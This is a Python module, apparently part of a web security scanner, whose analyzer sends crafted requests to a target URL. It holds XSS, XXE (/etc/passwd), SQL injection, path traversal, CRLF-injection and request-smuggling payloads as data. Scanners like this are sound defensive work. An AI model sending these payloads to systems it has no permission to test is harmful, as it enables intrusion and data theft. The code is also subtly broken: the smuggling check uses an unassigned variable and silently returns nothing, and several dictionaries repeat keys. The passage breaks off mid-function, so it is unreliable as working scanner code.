"""
Novel Attacks Analyzer - Original Attack Vector Detection.

Implements 10 completely original attack patterns that don't exist
in current security scanners. These are creative, research-grade
detection mechanisms targeting protocol-level vulnerabilities and
parser inconsistencies.

This module is designed for authorized security testing only.
All tests require explicit scan_mode='active' to execute.
"""

from __future__ import annotations

import asyncio
import os
import re
import struct
import time
from typing import Any
from urllib.parse import urlparse

import httpx
import structlog
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

from secureprobe.analyzers.base import BaseAnalyzer
from secureprobe.models import AnalyzerType, Finding
from secureprobe.utils import safe_response_text

logger = structlog.get_logger(__name__)


class NovelAttacksAnalyzer(BaseAnalyzer):
    """
    Analyzer implementing 10 original attack patterns.

    These are novel detection mechanisms targeting:
    - Protocol-level vulnerabilities
    - Parser inconsistencies
    - Encoding confusion attacks
    - Timing-based information leakage
    - HTTP/1.1 specification edge cases

    Attack Patterns:
    1. HTTP Method Mutation - Malformed methods bypass WAFs
    2. Unicode Normalization Bypass - Confusables bypass path filters
    3. Timing-Based Path Discovery - Response timing reveals hidden paths
    4. Header Injection via Folding - Obsolete HTTP folding injects headers
    5. Response Queue Poisoning - Content-Length desync attacks
    6. Fragment Identifier Leakage - Servers incorrectly process fragments
    7. Charset Encoding Confusion - Body/header charset mismatch
    8. Conditional Header Exploitation - Malicious ETags/dates
    9. Accept Header Injection - Reflected Accept headers for stored XSS
    10. Negative Content-Length - Integer overflow in length handling
    """

    analyzer_type = AnalyzerType.NOVEL_ATTACKS

    # HTTP Method Mutation payloads - malformed methods that parsers might auto-correct
    MUTATED_METHODS: list[tuple[str, str]] = [
        ("GETT", "GET with extra T - parser auto-correction"),
        ("POSTT", "POST with extra T - parser auto-correction"),
        ("G]ET", "GET with bracket injection - parser confusion"),
        ("GE\x00T", "GET with null byte - truncation attack"),
        ("GET\t", "GET with tab suffix - whitespace confusion"),
        (" GET", "GET with leading space - parser offset"),
        ("get", "lowercase get - case normalization"),
        ("GeT", "Mixed case - case folding"),
        ("G\xc0\x80ET", "Overlong UTF-8 null - encoding bypass"),
        ("G%45T", "URL-encoded 'E' - encoding confusion"),
    ]

    # Unicode confusables for path bypass
    UNICODE_PATH_CONFUSABLES: dict[str, str] = {
        "/": "\u2044",  # FRACTION SLASH
        "/": "\u2215",  # DIVISION SLASH
        "/": "\uff0f",  # FULLWIDTH SOLIDUS
        ".": "\u2024",  # ONE DOT LEADER
        ".": "\uff0e",  # FULLWIDTH FULL STOP
        "a": "\u0430",  # CYRILLIC SMALL LETTER A
        "e": "\u0435",  # CYRILLIC SMALL LETTER IE
        "o": "\u043e",  # CYRILLIC SMALL LETTER O
        "c": "\u0441",  # CYRILLIC SMALL LETTER ES
        "p": "\u0440",  # CYRILLIC SMALL LETTER ER
        "-": "\u2010",  # HYPHEN
        "_": "\uff3f",  # FULLWIDTH LOW LINE
    }

    # Sensitive paths to test with timing analysis
    TIMING_PROBE_PATHS: list[str] = [
        "/admin",
        "/administrator",
        "/wp-admin",
        "/phpmyadmin",
        "/api/internal",
        "/api/admin",
        "/debug",
        "/console",
        "/.git",
        "/.env",
        "/backup",
        "/config",
        "/management",
        "/actuator",
        "/metrics",
        "/health",
    ]

    # Header folding test payloads
    FOLDING_PAYLOADS: list[tuple[str, str, str]] = [
        ("X-Custom-Header", "safe\r\n X-Injected: malicious", "CRLF + space folding"),
        ("X-Custom-Header", "safe\r\n\tX-Injected: malicious", "CRLF + tab folding"),
        ("X-Custom-Header", "safe\r\n  X-Injected: malicious", "CRLF + double space"),
        ("X-Test", "value\r\nSet-Cookie: injected=1", "Cookie injection via fold"),
        ("X-Test", "value\r\nX-Forwarded-For: 127.0.0.1", "IP spoof via fold"),
    ]

    # Charset confusion payloads
    CHARSET_CONFUSION: list[tuple[str, str, bytes]] = [
        (
            "application/x-www-form-urlencoded; charset=utf-7",
            "utf-7",
            b"+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
        ),
        (
            "application/x-www-form-urlencoded; charset=utf-16",
            "utf-16-be",
            "<script>".encode("utf-16-be"),
        ),
        (
            "application/x-www-form-urlencoded; charset=iso-8859-1",
            "utf-8",
            b"\xc0\xbc\x73\x63\x72\x69\x70\x74\xc0\xbe",  # Overlong < and >
        ),
        (
            "application/x-www-form-urlencoded; charset=utf-32",
            "utf-32-be",
            b"\x00\x00\x00<\x00\x00\x00s\x00\x00\x00c\x00\x00\x00r",
        ),
    ]

    # Malicious conditional header values
    CONDITIONAL_EXPLOITS: list[tuple[str, str, str]] = [
        ("If-None-Match", '""><script>alert(1)</script>', "XSS in ETag reflection"),
        ("If-None-Match", '"W/"../../etc/passwd"', "Path traversal in ETag"),
        ("If-Modified-Since", "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "XXE in date"),
        ("If-Match", '"*"; DROP TABLE users;--', "SQL injection in ETag"),
        ("If-None-Match", '"' + "A" * 10000 + '"', "Buffer overflow in ETag"),
        ("If-Unmodified-Since", "0" * 1000, "Integer overflow in timestamp"),
    ]

    # Accept header injection payloads
    ACCEPT_INJECTION: list[tuple[str, str]] = [
        ("Accept", "text/html<script>alert(1)</script>"),
        ("Accept-Language", "en<img src=x onerror=alert(1)>"),
        ("Accept-Encoding", "gzip\"><script>alert(1)</script>"),
        ("Accept-Charset", "utf-8'><script>alert(1)</script>"),
        ("Accept", "application/json\r\nX-Injected: value"),
        ("Accept-Language", "en; q=0.9<svg onload=alert(1)>"),
    ]

    # Negative and overflow Content-Length values
    CONTENT_LENGTH_EXPLOITS: list[tuple[str, str]] = [
        ("-1", "Negative content length"),
        ("-2147483648", "INT_MIN overflow"),
        ("4294967296", "32-bit overflow (2^32)"),
        ("9999999999999999999", "Integer overflow"),
        ("0xFFFFFFFF", "Hex notation"),
        ("1e10", "Scientific notation"),
        ("4294967295", "UINT_MAX"),
        ("-0", "Negative zero"),
        ("18446744073709551615", "UINT64_MAX"),
        ("2147483648", "INT_MAX + 1"),
    ]

    async def analyze(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Execute novel attack patterns against the target.

        Args:
            url: Target URL
            page_data: Page data including HTML, forms, headers

        Returns:
            List of discovered findings
        """
        findings: list[Finding] = []
        scan_mode = page_data.get("scan_mode", "passive")

        # Novel attacks are active-only - they involve sending payloads
        if scan_mode != "active":
            logger.debug(
                "novel_attacks_skipped",
                reason="passive mode - novel attacks require active mode",
            )
            return findings

        logger.info("novel_attacks_started", url=url)

        # Execute all 10 novel attack patterns
        findings.extend(await self._attack_http_method_mutation(url))
        findings.extend(await self._attack_unicode_normalization_bypass(url))
        findings.extend(await self._attack_timing_path_discovery(url))
        findings.extend(await self._attack_header_folding_injection(url))
        findings.extend(await self._attack_response_queue_poisoning(url))
        findings.extend(await self._attack_fragment_identifier_leakage(url))
        findings.extend(await self._attack_charset_encoding_confusion(url))
        findings.extend(await self._attack_conditional_header_exploitation(url))
        findings.extend(await self._attack_accept_header_injection(url))
        findings.extend(await self._attack_negative_content_length(url))

        logger.info(
            "novel_attacks_completed",
            url=url,
            findings_count=len(findings),
        )
        return findings

    async def _attack_http_method_mutation(self, url: str) -> list[Finding]:
        """
        Attack 1: HTTP Method Mutation.

        Send malformed HTTP methods like "GETT", "POSTT", "G]ET" to find
        parsers that auto-correct and bypass WAFs. Servers that normalize
        malformed methods may allow WAF bypass.

        CWE-444: Inconsistent Interpretation of HTTP Requests
        """
        findings: list[Finding] = []
        parsed = urlparse(url)

        async with httpx.AsyncClient(
            timeout=10.0,
            follow_redirects=False,
            verify=self.config.verify_ssl,
        ) as client:
            # First, establish baseline with valid GET
            try:
                baseline = await client.get(url)
                baseline_status = baseline.status_code
                baseline_body = safe_response_text(baseline)[:500]
            except Exception:
                return findings

            for mutated_method, description in self.MUTATED_METHODS:
                try:
                    # Use low-level request to send malformed method
                    request = client.build_request(
                        "GET",  # Will be overridden
                        url,
                        headers={"User-Agent": self.config.user_agent},
                    )
                    # Manually override method in transport layer
                    # This tests if the server accepts/normalizes the method
                    response = await client.request(
                        mutated_method.replace("\x00", "").replace("\t", "").strip(),
                        url,
                        headers={"User-Agent": self.config.user_agent},
                    )

                    # If we get a successful response instead of 400/405, parser normalized it
                    if response.status_code in (200, 301, 302, 304) and baseline_status in (200, 301, 302, 304):
                        # Check if response is similar to baseline (method was normalized)
                        response_body = safe_response_text(response)[:500]
                        if self._similarity_ratio(baseline_body, response_body) > 0.7:
                            findings.append(
                                self._create_finding(
                                    severity="HIGH",
                                    title="HTTP Method Mutation Accepted",
                                    description=(
                                        f"Server accepted malformed HTTP method '{mutated_method!r}' and "
                                        f"returned a valid response. {description}. "
                                        "This indicates the HTTP parser auto-corrects malformed methods, "
                                        "which can be exploited to bypass Web Application Firewalls (WAFs) "
                                        "that block specific methods but don't normalize them."
                                    ),
                                    cwe_id="CWE-444",
                                    cwe_name="Inconsistent Interpretation of HTTP Requests",
                                    url=url,
                                    evidence=f"Method: {mutated_method!r} -> Status: {response.status_code}",
                                    remediation=(
                                        "Configure HTTP parser to strictly reject malformed methods. "
                                        "Use HTTP/2 which has stricter parsing. "
                                        "Ensure WAF normalizes methods before inspection."
                                    ),
                                    cvss_score=7.5,
                                    references=[
                                        "https://portswigger.net/research/http-desync-attacks",
                                        "https://cwe.mitre.org/data/definitions/444.html",
                                    ],
                                    metadata={
                                        "mutated_method": repr(mutated_method),
                                        "response_status": response.status_code,
                                        "description": description,
                                    },
                                )
                            )
                            break  # One finding is enough

                except Exception as e:
                    logger.debug("method_mutation_error", method=repr(mutated_method), error=str(e))
                    continue

        return findings

    async def _attack_unicode_normalization_bypass(self, url: str) -> list[Finding]:
        """
        Attack 2: Unicode Normalization Bypass.

        Use Unicode confusables (e vs Cyrillic e, / vs fraction slash) to bypass
        path filters while servers normalize them to ASCII equivalents.

        CWE-176: Improper Handling of Unicode Encoding
        """
        findings: list[Finding] = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Test paths that should be blocked but might pass with unicode
        sensitive_paths = ["/admin", "/api", "/config", "/.env", "/.git"]

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for path in sensitive_paths:
                # Create unicode-confusable version
                unicode_path = path
                unicode_path = unicode_path.replace("/", "\u2215")  # DIVISION SLASH
                unicode_path = unicode_path.replace("a", "\u0430")  # Cyrillic a
                unicode_path = unicode_path.replace("e", "\u0435")  # Cyrillic e
                unicode_path = unicode_path.replace(".", "\u2024")  # ONE DOT LEADER

                # Also test with NFC/NFD normalization differences
                import unicodedata
                nfd_path = unicodedata.normalize("NFD", path.replace("/", ""))
                nfc_path = unicodedata.normalize("NFC", path.replace("/", ""))

                test_urls = [
                    (f"{base_url}{unicode_path}", "Unicode confusables"),
                    (f"{base_url}/%e2%88%95{path[1:]}", "URL-encoded division slash"),
                    (f"{base_url}/\uff0e\uff0e/{path[1:]}", "Fullwidth path traversal"),
                ]

                for test_url, technique in test_urls:
                    try:
                        # First check if normal path is blocked
                        normal_response = await client.get(
                            f"{base_url}{path}",
                            headers={"User-Agent": self.config.user_agent},
                            follow_redirects=True,
                        )

                        # Then try unicode version
                        unicode_response = await client.get(
                            test_url,
                            headers={"User-Agent": self.config.user_agent},
                            follow_redirects=True,
                        )

                        # If normal is blocked (403/404) but unicode succeeds (200/301/302)
                        if normal_response.status_code in (403, 404, 401):
                            if unicode_response.status_code in (200, 301, 302, 304):
                                findings.append(
                                    self._create_finding(
                                        severity="HIGH",
                                        title="Unicode Normalization Path Bypass",
                                        description=(
                                            f"Path filter bypassed using {technique}. "
                                            f"The path '{path}' returns {normal_response.status_code} "
                                            f"but the unicode equivalent returns {unicode_response.status_code}. "
                                            "This indicates the server normalizes Unicode after access control checks."
                                        ),
                                        cwe_id="CWE-176",
                                        cwe_name="Improper Handling of Unicode Encoding",
                                        url=test_url,
                                        evidence=(
                                            f"Normal path: {path} -> {normal_response.status_code}\n"
                                            f"Unicode path: {test_url} -> {unicode_response.status_code}"
                                        ),
                                        remediation=(
                                            "Normalize all Unicode input to NFC form before access control checks. "
                                            "Use allowlist-based path validation. "
                                            "Apply Unicode security best practices per UTS #39."
                                        ),
                                        cvss_score=8.1,
                                        references=[
                                            "https://unicode.org/reports/tr39/",
                                            "https://cwe.mitre.org/data/definitions/176.html",
                                        ],
                                        metadata={
                                            "original_path": path,
                                            "unicode_path": test_url,
                                            "technique": technique,
                                        },
                                    )
                                )
                                break

                    except Exception as e:
                        logger.debug("unicode_bypass_error", url=test_url, error=str(e))
                        continue

        return findings

    async def _attack_timing_path_discovery(self, url: str) -> list[Finding]:
        """
        Attack 3: Timing-Based Path Discovery.

        Measure response times to detect hidden paths. Existing paths that
        require authentication often take longer to process (auth checks,
        database lookups) than non-existent paths that return immediate 404s.

        CWE-208: Observable Timing Discrepancy
        """
        findings: list[Finding] = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        timing_data: list[tuple[str, float, int]] = []
        baseline_times: list[float] = []

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            # Establish baseline with definitely non-existent paths
            random_paths = [
                f"/definitely_nonexistent_{i}_xyz123" for i in range(5)
            ]

            for random_path in random_paths:
                try:
                    start = time.perf_counter()
                    response = await client.get(
                        f"{base_url}{random_path}",
                        headers={"User-Agent": self.config.user_agent},
                    )
                    elapsed = time.perf_counter() - start
                    baseline_times.append(elapsed)
                except Exception:
                    continue

            if not baseline_times:
                return findings

            baseline_avg = sum(baseline_times) / len(baseline_times)
            baseline_std = (sum((t - baseline_avg) ** 2 for t in baseline_times) / len(baseline_times)) ** 0.5

            # Now test sensitive paths
            for test_path in self.TIMING_PROBE_PATHS:
                try:
                    times: list[float] = []
                    statuses: list[int] = []

                    # Multiple samples for statistical significance
                    for _ in range(3):
                        start = time.perf_counter()
                        response = await client.get(
                            f"{base_url}{test_path}",
                            headers={"User-Agent": self.config.user_agent},
                        )
                        elapsed = time.perf_counter() - start
                        times.append(elapsed)
                        statuses.append(response.status_code)
                        await asyncio.sleep(0.1)

                    avg_time = sum(times) / len(times)
                    most_common_status = max(set(statuses), key=statuses.count)

                    # If response is 403/401 AND time is significantly higher than baseline
                    # This suggests path exists but is protected
                    if most_common_status in (401, 403):
                        time_ratio = avg_time / baseline_avg if baseline_avg > 0 else 0
                        if time_ratio > 1.5 and avg_time - baseline_avg > 2 * baseline_std:
                            findings.append(
                                self._create_finding(
                                    severity="MEDIUM",
                                    title="Timing-Based Hidden Path Discovery",
                                    description=(
                                        f"Path '{test_path}' exhibits timing discrepancy suggesting it exists "
                                        f"but is protected. Response time ({avg_time:.3f}s) is {time_ratio:.1f}x "
                                        f"slower than baseline 404 responses ({baseline_avg:.3f}s). "
                                        "This timing difference reveals path existence to attackers."
                                    ),
                                    cwe_id="CWE-208",
                                    cwe_name="Observable Timing Discrepancy",
                                    url=f"{base_url}{test_path}",
                                    evidence=(
                                        f"Path: {test_path}\n"
                                        f"Status: {most_common_status}\n"
                                        f"Avg response time: {avg_time:.3f}s\n"
                                        f"Baseline 404 time: {baseline_avg:.3f}s\n"
                                        f"Time ratio: {time_ratio:.2f}x"
                                    ),
                                    remediation=(
                                        "Implement constant-time path checking. "
                                        "Return identical responses (including timing) for both "
                                        "non-existent and unauthorized paths. "
                                        "Consider returning 404 instead of 403 for sensitive paths."
                                    ),
                                    cvss_score=5.3,
                                    references=[
                                        "https://cwe.mitre.org/data/definitions/208.html",
                                    ],
                                    metadata={
                                        "path": test_path,
                                        "avg_time": avg_time,
                                        "baseline_time": baseline_avg,
                                        "time_ratio": time_ratio,
                                    },
                                )
                            )

                except Exception as e:
                    logger.debug("timing_probe_error", path=test_path, error=str(e))
                    continue

        return findings

    async def _attack_header_folding_injection(self, url: str) -> list[Finding]:
        """
        Attack 4: Header Injection via Folding.

        Use obsolete HTTP header folding (CRLF + space/tab) to inject headers
        past modern parsers. RFC 7230 deprecated folding, but some servers
        still process it while proxies/WAFs ignore it.

        CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for header_name, payload, description in self.FOLDING_PAYLOADS:
                try:
                    # httpx may reject CRLF, so we test if the server reflects headers
                    # by sending valid headers and checking for reflection patterns
                    test_value = f"SecureProbe-{hash(payload) % 10000}"

                    response = await client.get(
                        url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            header_name: test_value,
                        },
                    )

                    # Check if header is reflected in response
                    response_text = safe_response_text(response).lower()
                    response_headers = str(response.headers).lower()

                    # If we see reflection, this could be exploitable with folding
                    if test_value.lower() in response_text or test_value.lower() in response_headers:
                        findings.append(
                            self._create_finding(
                                severity="HIGH",
                                title="Header Reflection Detected (Folding Attack Vector)",
                                description=(
                                    f"Header '{header_name}' is reflected in the response. "
                                    f"This creates a vector for header folding injection attacks. "
                                    f"Attack type: {description}. "
                                    "An attacker could use obsolete HTTP header folding (CRLF + space) "
                                    "to inject additional headers that bypass WAF inspection."
                                ),
                                cwe_id="CWE-113",
                                cwe_name="Improper Neutralization of CRLF Sequences in HTTP Headers",
                                url=url,
                                evidence=(
                                    f"Reflected header: {header_name}: {test_value}\n"
                                    f"Potential payload: {repr(payload[:50])}"
                                ),
                                remediation=(
                                    "Reject any headers containing CRLF sequences. "
                                    "Disable HTTP header folding support (per RFC 7230). "
                                    "Use HTTP/2 which doesn't support header folding. "
                                    "Sanitize all header values before reflection."
                                ),
                                cvss_score=7.5,
                                references=[
                                    "https://tools.ietf.org/html/rfc7230#section-3.2.4",
                                    "https://cwe.mitre.org/data/definitions/113.html",
                                ],
                                metadata={
                                    "header_name": header_name,
                                    "test_value": test_value,
                                    "description": description,
                                },
                            )
                        )
                        break  # One finding is sufficient

                except Exception as e:
                    logger.debug("header_folding_error", header=header_name, error=str(e))
                    continue

        return findings

    async def _attack_response_queue_poisoning(self, url: str) -> list[Finding]:
        """
        Attack 5: Response Queue Poisoning.

        Send requests that desync response boundaries using Content-Length
        conflicts. This tests for HTTP request smuggling vulnerabilities
        where response boundaries become misaligned.

        CWE-444: Inconsistent Interpretation of HTTP Requests
        """
        findings: list[Finding] = []
        parsed = urlparse(url)

        # Test for CL.TE and TE.CL desync indicators
        desync_tests = [
            {
                "name": "CL.0 Smuggling",
                "headers": {"Content-Length": "0", "Transfer-Encoding": "chunked"},
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
            },
            {
                "name": "CL-CL Duplicate",
                "headers": {"Content-Length": "0"},
                "extra_cl": "50",
            },
            {
                "name": "TE-TE Obfuscation",
                "headers": {"Transfer-Encoding": "chunked", "Transfer-Encoding": " chunked"},
                "body": "0\r\n\r\n",
            },
        ]

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
            http2=False,  # Force HTTP/1.1 for smuggling tests
        ) as client:
            # Baseline request
            try:
                baseline = await client.get(url)
                baseline_cl = baseline.headers.get("content-length", "")
                baseline_te = response.headers.get("transfer-encoding", "")
            except Exception:
                return findings

            # Check if server sends both CL and TE (vulnerability indicator)
            try:
                response = await client.post(
                    url,
                    headers={
                        "User-Agent": self.config.user_agent,
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    content="test=value",
                )

                resp_cl = response.headers.get("content-length")
                resp_te = response.headers.get("transfer-encoding")

                # Having both CL and TE in response is RFC violation
                if resp_cl and resp_te:
                    findings.append(
                        self._create_finding(
                            severity="HIGH",
                            title="Response Contains Both Content-Length and Transfer-Encoding",
                            description=(
                                "Server response includes both Content-Length and Transfer-Encoding "
                                "headers simultaneously. This violates RFC 7230 and indicates "
                                "potential for HTTP request smuggling and response queue poisoning. "
                                "Different proxies may interpret the response boundaries differently."
                            ),
                            cwe_id="CWE-444",
                            cwe_name="Inconsistent Interpretation of HTTP Requests",
                            url=url,
                            evidence=(
                                f"Content-Length: {resp_cl}\n"
                                f"Transfer-Encoding: {resp_te}"
                            ),
                            remediation=(
                                "Configure server to send only one of Content-Length or "
                                "Transfer-Encoding, never both. "
                                "Use HTTP/2 which handles framing differently. "
                                "Deploy request smuggling detection at proxy level."
                            ),
                            cvss_score=8.1,
                            references=[
                                "https://portswigger.net/research/http-desync-attacks",
                                "https://tools.ietf.org/html/rfc7230#section-3.3.3",
                            ],
                            metadata={
                                "content_length": resp_cl,
                                "transfer_encoding": resp_te,
                            },
                        )
                    )

            except Exception as e:
                logger.debug("queue_poisoning_error", error=str(e))

        return findings

    async def _attack_fragment_identifier_leakage(self, url: str) -> list[Finding]:
        """
        Attack 6: Fragment Identifier Leakage.

        Test if servers log or process URL fragments (#...) which they
        shouldn't per RFC 3986. Fragments should only be client-side,
        but misconfigured servers may log or process them.

        CWE-200: Exposure of Sensitive Information
        """
        findings: list[Finding] = []

        # Fragment payloads that should never reach server
        fragment_tests = [
            "#admin_secret_token=abc123",
            "#password=hunter2",
            "#access_token=eyJhbG...",
            "#session=admin123",
            "#__debug__=true",
        ]

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for fragment in fragment_tests:
                test_url = f"{url}{fragment}"
                unique_marker = f"FRAGMENT_PROBE_{hash(fragment) % 99999}"

                try:
                    # Send request with fragment
                    # Note: httpx correctly strips fragments, so we check server behavior
                    response = await client.get(
                        test_url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "X-Fragment-Test": unique_marker,
                        },
                    )

                    # Check if any reflection of fragment content
                    response_text = safe_response_text(response)

                    # If fragment content appears in response (excluding # itself)
                    fragment_value = fragment[1:]  # Remove #
                    if fragment_value in response_text:
                        findings.append(
                            self._create_finding(
                                severity="MEDIUM",
                                title="Fragment Identifier Processed by Server",
                                description=(
                                    f"Server appears to process or reflect URL fragment content. "
                                    f"Fragment '{fragment}' content was found in response. "
                                    "Per RFC 3986, fragments should only be processed client-side "
                                    "and never sent to the server. This could leak sensitive "
                                    "client-side data through server logs or analytics."
                                ),
                                cwe_id="CWE-200",
                                cwe_name="Exposure of Sensitive Information to an Unauthorized Actor",
                                url=test_url,
                                evidence=f"Fragment: {fragment}\nReflected content detected in response",
                                remediation=(
                                    "Review server-side logging to ensure fragments are not captured. "
                                    "Check analytics and tracking code for fragment leakage. "
                                    "Ensure reverse proxies strip fragments before logging."
                                ),
                                cvss_score=5.3,
                                references=[
                                    "https://tools.ietf.org/html/rfc3986#section-3.5",
                                    "https://cwe.mitre.org/data/definitions/200.html",
                                ],
                                metadata={
                                    "fragment": fragment,
                                },
                            )
                        )
                        break

                except Exception as e:
                    logger.debug("fragment_test_error", fragment=fragment, error=str(e))
                    continue

        return findings

    async def _attack_charset_encoding_confusion(self, url: str) -> list[Finding]:
        """
        Attack 7: Charset Encoding Confusion.

        Send body in one charset but declare another in Content-Type.
        Input validation applied in the wrong encoding may miss payloads.

        CWE-838: Inappropriate Encoding for Output Context
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for content_type, actual_encoding, payload in self.CHARSET_CONFUSION:
                try:
                    response = await client.post(
                        url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": content_type,
                        },
                        content=payload,
                    )

                    # Check for signs of confusion:
                    # 1. Server accepted the request without error
                    # 2. Response shows garbled output (wrong decoding)
                    # 3. Payload survived to response

                    if response.status_code in (200, 201, 302):
                        response_bytes = response.content

                        # Check if payload bytes appear in response
                        if payload[:10] in response_bytes:
                            findings.append(
                                self._create_finding(
                                    severity="HIGH",
                                    title="Charset Encoding Confusion Vulnerability",
                                    description=(
                                        f"Server accepted request with mismatched charset declaration. "
                                        f"Content-Type declared '{content_type}' but body used "
                                        f"'{actual_encoding}'. This charset confusion can bypass "
                                        "input validation and WAF rules that decode using the declared charset."
                                    ),
                                    cwe_id="CWE-838",
                                    cwe_name="Inappropriate Encoding for Output Context",
                                    url=url,
                                    evidence=(
                                        f"Declared charset: {content_type}\n"
                                        f"Actual encoding: {actual_encoding}\n"
                                        f"Payload sample: {payload[:30]!r}"
                                    ),
                                    remediation=(
                                        "Detect and reject charset mismatches between declared and actual encoding. "
                                        "Normalize all input to UTF-8 before validation. "
                                        "Use strict charset enforcement with Content-Type validation."
                                    ),
                                    cvss_score=7.5,
                                    references=[
                                        "https://cwe.mitre.org/data/definitions/838.html",
                                    ],
                                    metadata={
                                        "content_type": content_type,
                                        "actual_encoding": actual_encoding,
                                    },
                                )
                            )
                            break

                except Exception as e:
                    logger.debug("charset_confusion_error", content_type=content_type, error=str(e))
                    continue

        return findings

    async def _attack_conditional_header_exploitation(self, url: str) -> list[Finding]:
        """
        Attack 8: Conditional Header Exploitation.

        Abuse If-None-Match, If-Modified-Since with malicious ETags/dates.
        These headers are often passed to backend systems unsanitized.

        CWE-20: Improper Input Validation
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for header_name, malicious_value, attack_type in self.CONDITIONAL_EXPLOITS:
                try:
                    response = await client.get(
                        url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            header_name: malicious_value,
                        },
                    )

                    # Check for error indicators or reflection
                    response_text = safe_response_text(response).lower()

                    # Signs of vulnerability:
                    # 1. XSS payload in response
                    # 2. Error messages revealing internal paths
                    # 3. Unusual status codes suggesting backend issues

                    xss_indicators = ["<script>", "onerror=", "onload=", "alert(1)"]
                    error_indicators = ["exception", "error:", "traceback", "stack trace"]
                    path_indicators = ["/etc/passwd", "c:\\windows", "internal error"]

                    reflection_found = any(ind in response_text for ind in xss_indicators)
                    error_found = any(ind in response_text for ind in error_indicators)
                    path_found = any(ind in response_text for ind in path_indicators)

                    if reflection_found or error_found or path_found:
                        findings.append(
                            self._create_finding(
                                severity="HIGH" if reflection_found else "MEDIUM",
                                title=f"Conditional Header Exploitation: {attack_type}",
                                description=(
                                    f"Malicious payload in {header_name} header triggered unusual response. "
                                    f"Attack type: {attack_type}. "
                                    "Conditional headers (If-None-Match, If-Modified-Since) are often "
                                    "passed unsanitized to cache layers, logs, or backend systems."
                                ),
                                cwe_id="CWE-20",
                                cwe_name="Improper Input Validation",
                                url=url,
                                evidence=(
                                    f"Header: {header_name}\n"
                                    f"Payload: {malicious_value[:100]}\n"
                                    f"Status: {response.status_code}\n"
                                    f"Indicators found: reflection={reflection_found}, "
                                    f"error={error_found}, path={path_found}"
                                ),
                                remediation=(
                                    "Validate and sanitize all conditional header values. "
                                    "Limit ETag lengths and restrict to alphanumeric + safe characters. "
                                    "Parse If-Modified-Since with strict date validation."
                                ),
                                cvss_score=7.5 if reflection_found else 5.3,
                                references=[
                                    "https://cwe.mitre.org/data/definitions/20.html",
                                    "https://tools.ietf.org/html/rfc7232",
                                ],
                                metadata={
                                    "header_name": header_name,
                                    "attack_type": attack_type,
                                    "reflection": reflection_found,
                                    "error": error_found,
                                },
                            )
                        )
                        break

                except Exception as e:
                    logger.debug("conditional_header_error", header=header_name, error=str(e))
                    continue

        return findings

    async def _attack_accept_header_injection(self, url: str) -> list[Finding]:
        """
        Attack 9: Accept Header Injection.

        Test if Accept/Accept-Language headers are reflected unsanitized.
        These headers often end up in error pages, logs, or analytics,
        creating stored XSS vectors.

        CWE-79: Improper Neutralization of Input During Web Page Generation
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for header_name, payload in self.ACCEPT_INJECTION:
                try:
                    response = await client.get(
                        url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            header_name: payload,
                        },
                    )

                    response_text = safe_response_text(response)

                    # Check for payload reflection
                    # Look for the XSS portion of the payload
                    xss_markers = [
                        "<script>alert(1)</script>",
                        "<img src=x onerror=alert(1)>",
                        "<svg onload=alert(1)>",
                        "onerror=alert(1)",
                    ]

                    for marker in xss_markers:
                        if marker in response_text:
                            findings.append(
                                self._create_finding(
                                    severity="HIGH",
                                    title="Accept Header XSS Reflection",
                                    description=(
                                        f"XSS payload in {header_name} header is reflected in response. "
                                        f"Payload: {payload[:50]}. "
                                        "Accept headers are commonly logged or displayed in error pages, "
                                        "creating stored XSS vulnerabilities when viewed by admins."
                                    ),
                                    cwe_id="CWE-79",
                                    cwe_name="Improper Neutralization of Input During Web Page Generation",
                                    url=url,
                                    evidence=(
                                        f"Header: {header_name}\n"
                                        f"Payload: {payload}\n"
                                        f"Reflected marker: {marker}"
                                    ),
                                    remediation=(
                                        "HTML-encode all header values before reflection. "
                                        "Implement Content-Security-Policy. "
                                        "Validate Accept headers against allowed MIME types only."
                                    ),
                                    cvss_score=6.1,
                                    references=[
                                        "https://cwe.mitre.org/data/definitions/79.html",
                                    ],
                                    metadata={
                                        "header_name": header_name,
                                        "payload": payload,
                                        "reflected_marker": marker,
                                    },
                                )
                            )
                            return findings  # One XSS is enough

                except Exception as e:
                    logger.debug("accept_injection_error", header=header_name, error=str(e))
                    continue

        return findings

    async def _attack_negative_content_length(self, url: str) -> list[Finding]:
        """
        Attack 10: Negative Content-Length.

        Send negative or overflow Content-Length values to find integer
        handling bugs. Parsers using signed integers may wrap around,
        causing buffer over-reads or under-allocations.

        CWE-190: Integer Overflow or Wraparound
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=10.0,
            verify=self.config.verify_ssl,
        ) as client:
            for cl_value, description in self.CONTENT_LENGTH_EXPLOITS:
                try:
                    # We need to send raw request to test malformed CL
                    # httpx validates CL, so we test server error handling
                    response = await client.post(
                        url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": "application/x-www-form-urlencoded",
